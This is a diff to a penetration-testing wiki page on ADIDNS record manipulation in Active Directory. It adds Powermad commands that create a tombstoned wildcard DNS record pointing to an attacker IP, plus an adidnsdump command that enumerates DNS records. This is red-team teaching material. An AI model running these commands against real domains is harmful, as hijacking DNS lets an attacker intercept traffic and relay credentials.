@@ -17,9 +17,9 @@ ADIDNS zones can be remotely edited
 
 ## Practice
 
-### Manual record addition/edition
+### Manual record manipulation
 
-On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add/view/edit/enable/disable a record. In the following examples, the wildcard \(`*`\) record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\). The standard process when creating a new record is to add the record, then set it \(populate it's DnsRecord attribute\) and then enable it.
+On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add/view/edit/enable/disable/remove records. In the following examples, the wildcard \(`*`\) record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\).
 
 {% tabs %}
 {% tab title="Get/Read" %}
@@ -31,10 +31,10 @@ Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
 {% endtab %}
 
 {% tab title="Add" %}
-The following command creates a wildcard record and sets the `dNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).
+The following command creates a wildcard record, sets the `DNSRecord` attribute and sets the `DNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).
 
-```text
-New-ADIDNSNode -Node * -Tombstone -Verbose
+```bash
+New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
 ```
 {% endtab %}
 
@@ -47,7 +47,7 @@ Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray 
 {% endtab %}
 
 {% tab title="Enable" %}
-Once a record is set and populated, it can be enable with the following command.
+A tombstoned record can be turned again into a valid record with the following command. This should be used in place of `New-ADIDNSNode` when working with nodes that already exist due to being previously added.
 
 ```bash
 Enable-ADIDNSNode -Node *
@@ -81,7 +81,22 @@ That command will either return an IP address, indicating that the wildcard reco
 {% endtab %}
 {% endtabs %}
 
+{% hint style="info" %}
+**TL; DR**: the following command will add a new wildcard record \(if it doesn't already exist\) with the attacker IP set in the DNSRecord attribute
+
+```bash
+New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
+```
+{% endhint %}
+
 More help on usage, support functions, parameters and attacks [here](https://github.com/Kevin-Robertson/Powermad#adidns-functions).
+
+On UNIX-like systems, [adidnsdump](https://github.com/dirkjanm/adidnsdump) \(Python\) can be used for enumeration and export of all DNS records in the Active Directory Domain or Forest DNS zones.
+
+```bash
+adidnsdump -u "DOMAIN\user" -p 'password' --include-tombstoned $DOMAIN_CONTROLLER
+grep "*" records.csv
+```
 
 ### Dynamic spoofing
 
